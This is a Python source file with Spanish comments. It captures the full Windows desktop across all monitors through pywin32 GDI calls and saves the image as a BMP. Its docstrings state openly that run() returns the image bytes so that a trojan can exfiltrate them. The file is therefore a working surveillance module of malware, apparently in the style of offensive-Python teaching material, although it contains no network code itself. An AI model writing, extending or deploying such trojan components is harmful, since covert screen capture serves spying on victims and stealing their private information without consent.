"""
screenshotter.py - Captura de pantalla completa (Windows)
=========================================================
Captura todos los monitores virtuales del escritorio de Windows usando la
API GDI vía pywin32 y guarda el resultado como fichero BMP. La función
`run()` devuelve el contenido binario de la captura para que pueda ser
exfiltrado por el troyano.

REQUISITOS:
    pip install pywin32

EJEMPLOS DE EJECUCIÓN:
    python screenshotter.py
    # Guarda screenshot.bmp en el directorio actual.

    # Como módulo de troyano:
    import screenshotter
    img_bytes = screenshotter.run()
"""

import win32api
import win32con
import win32gui
import win32ui


def get_dimensions():
    """
    Obtiene las dimensiones del escritorio virtual (todos los monitores).

    Returns:
        tuple: (width, height, left, top) en píxeles.
    """
    width  = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left   = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top    = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return width, height, left, top


def screenshot(name='screenshot'):
    """
    Captura el escritorio completo (todos los monitores) y lo guarda
    como `<name>.bmp` usando la API GDI de Windows.

    Args:
        name (str): Nombre base del fichero de salida (sin extensión).
    """
    hdesktop = win32gui.GetDesktopWindow()
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc     = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc     = img_dc.CreateCompatibleDC()

    bmp = win32ui.CreateBitmap()
    bmp.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(bmp)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

    bmp.SaveBitmapFile(mem_dc, f'{name}.bmp')

    mem_dc.DeleteDC()
    win32gui.DeleteObject(bmp.GetHandle())


def run():
    """
    Toma una captura de pantalla y devuelve su contenido binario.
    Diseñado para ser llamado por el troyano como módulo de recolección.

    Returns:
        bytes: Contenido del fichero BMP capturado.
    """
    screenshot()
    # FIX: `open('screenshot.bmp')` → `open('screenshot.bmp', 'rb')`
    #       Modo texto corrompería los bytes del BMP en Windows
    with open('screenshot.bmp', 'rb') as f:
        img = f.read()
    return img


if __name__ == '__main__':
    screenshot()
